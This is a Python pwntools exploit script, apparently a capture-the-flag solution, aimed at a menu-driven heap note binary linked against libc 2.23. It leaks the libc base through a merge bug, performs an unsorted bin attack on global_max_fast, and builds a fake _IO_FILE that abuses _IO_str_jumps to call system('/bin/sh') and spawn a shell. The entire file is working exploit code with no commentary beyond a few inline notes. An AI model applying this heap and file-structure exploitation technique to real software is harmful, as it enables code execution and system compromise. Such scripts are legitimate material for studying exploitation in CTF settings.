from pwn import*
context(arch='AMD64',log_level='DEBUG')
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xFBAD2887) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(1)#satisfy write_base < write_ptr
	fake_IO_FILE += p64(0) + p64(binsh)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
	fake_IO_FILE += p64(IO_str_jumps-8)
	fake_IO_FILE += p64(0) + p64(system)
	return fake_IO_FILE
def insert(size,content):
	p.sendlineafter('choice: ','1')
	p.sendlineafter('entry: ',str(size))
	content = content.ljust(size,'\x00')
	p.sendafter('data: ',content)
def update(ID,size,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('ID: ',str(ID))
	p.sendlineafter('entry: ',str(size))
	content = content.ljust(size,'\x00')
	p.sendafter('data: ',content)
def merge(ID,MID):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('from',str(ID))
	p.sendlineafter('ID: ',str(MID))
def delete(ID):
	p.sendlineafter('choice: ','4')
	p.sendlineafter('ID: ',str(ID))
def view(ID):
	p.sendlineafter('choice: ','5')
	p.sendlineafter('ID: ',str(ID))
def list(ID):
	p.sendlineafter('choice: ','6')
p = process('./main')
libc = ELF('./libc-2.23.so',checksec=False)
insert(0x40,'FMYY') #0
insert(0x40,'FMYY') #1
insert(0x80,'FMYY') #2
insert(0x1000-0x10,'FMYY')#3
insert(0x400,'FMYY') #4
insert(0x400,'FMYY') #5
insert(0x80,'FMYY') #6
merge(0,0)
view(7)
p.recvline()
libc_base = u64(p.recv(6).ljust(8,'\x00')) -88 - libc.sym['__malloc_hook'] -0x10
log.info('LIBC:\t' + hex(libc_base))
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
IO_str_jumps = libc_base + 0x3C37A0
Global_max_fast = libc_base + 0x3C67F8
IO_list_all = libc_base + libc.sym['_IO_list_all']
fake_IO_FILE = FILE(binsh,system,IO_str_jumps)
update(3,0x1000-0x10,fake_IO_FILE[0x10:])
delete(4)	#free the chunk4 which is next to the chunk3
merge(5,3)	#so the chunk3 and chunk4 will unlink,then we can get a 0x1410 chunk,emmm,the ID will be changed into 0
update(7,0x80,p64(0) + p64(Global_max_fast - 0x10))
insert(0x80,'FMYY')
delete(0)
p.sendlineafter('choice: ','1')
p.sendlineafter('entry: ',str(0x80))
p.interactive()

